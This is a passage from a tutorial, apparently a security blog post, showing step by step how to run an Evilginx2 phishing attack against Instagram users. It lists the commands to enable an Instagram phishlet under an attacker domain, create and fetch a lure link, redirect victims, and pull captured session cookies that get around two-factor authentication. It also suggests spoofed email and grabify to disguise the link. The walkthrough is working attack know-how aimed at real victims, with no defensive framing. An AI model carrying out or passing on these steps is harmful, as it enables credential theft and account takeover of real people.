Performing the Attack

Firstly, we can see the list of phishlets available so that we can select which website do we want to phish the victim. The list of phislets can be displayed by simply typing:

phishlets

 

Thereafter, we need to select which phishlet we want to use and also set the hostname for that phishlet. In this case, I am using the Instagram phishlet:

phishlets hostname instagram instagram.macrosec.xyz

After that we need to enable the phishlet by typing the following command:

phishlets enable instagram

We can verify if the phishlet has been enabled by typing phishlets again:

 

After that we need to create a lure to generate a link to be sent to the victim. This can be done by typing the following command:

lures create instagram

After that, we need to specify the redirect URL so that Evilginx2 redirects the user to the original Instagram page after capturing the session cookies. This can be done by typing the following command:

lures edit [id] redirect_url https://www.instagram.com/

We can verify if the lure has been created successfully by typing the following command:

lures

Thereafter, we can get the link to be sent to the victim by typing the following:

lures get-url [id]

 

We can send the link generated by various techniques. One of the examples can be via a spoofed email and also grabify can be used to spoof the URL to make it look less suspicious.

After the victim clicks on the link and visits the page, the victim is shown a perfect mirror of instagram.com. This can fool the victim into typing their credentials to log into the instagram.com that is displayed to the victim by Evilginx2. The image of the login page is shown below:

 

After the victim provides their credentials, they might be asked for the two-factor authentication (if they have set up 2FA), as shown below:

 

After the victim provides the 2FA code, the victim will be taken to their own account whereby they can browse as if they are logged into real instagram.com.

 

However, on the attacker side, the session cookies are already captured. The session can be displayed by typing:

sessions

After confirming that the session tokens are successfully captured, we can get the session cookies by typing:

sessions [id]


Host redirect rules for devmode

evilginx -developer

phishlets get-hosts <phishlet>

config domain

config external ipv4 ip
